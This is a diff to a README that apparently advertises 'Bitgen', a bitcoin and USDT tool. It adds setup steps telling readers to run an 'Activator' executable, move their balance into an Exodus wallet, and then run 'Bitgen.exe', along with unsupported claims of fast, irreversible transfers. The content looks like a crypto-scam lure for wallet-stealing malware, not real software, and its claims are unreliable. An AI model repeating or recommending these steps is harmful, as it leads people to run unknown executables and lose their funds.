@@ -1,5 +1,13 @@
 Picture of the program: https://imgur.com/a/FVraesf
 
+# Setup:
+1-) download all files ⭐
+2-) Open Bitgen Activator Exe ⭐
+3-) Read "Bitgen how to use.txt ⭐
+4-) After these steps, all you have to do is download the exodus wallet desktop application for speed and security. ⭐
+5-) After downloading, we send our balance to our exodus wallet account. ⭐
+6-) Finally, we run the "Bitgen.exe" file. ⭐
+✔️✔️ The installation is over, have fun. If the exe file gives an error, wait a while, it does not work properly on all computers, it will be fixed soon... ✔️✔️
 
 + Important: To use the full version of the program, you can download the full version and the most current working version from the "Release" section.
 
@@ -27,9 +35,9 @@ The transaction fee is "max", i.e. "priority" for quick confirmation
 Cannot cancel a transaction with bitcoin server
 You can spend bitcoins easily on any other address (Segwit address, legacy, Segwit / bch32)
 
-✔️ Works with any wallet 🖥 (exodus wallet, the wallet that can perform the fastest and most secure transactions)
-✔️ BTC & USDT 💸
-✔️ very fast and works perfectly 🌐
++ ✔️ Works with any wallet 🖥 (exodus wallet, the wallet that can perform the fastest and most secure transactions)
++ ✔️ BTC & USDT 💸 
++ ✔️ very fast and works perfectly 🌐
 
 ## Disclaimer⚠️
 Please ensure that you use this software responsibly and ethically. We do not endorse or support any illegal activity.
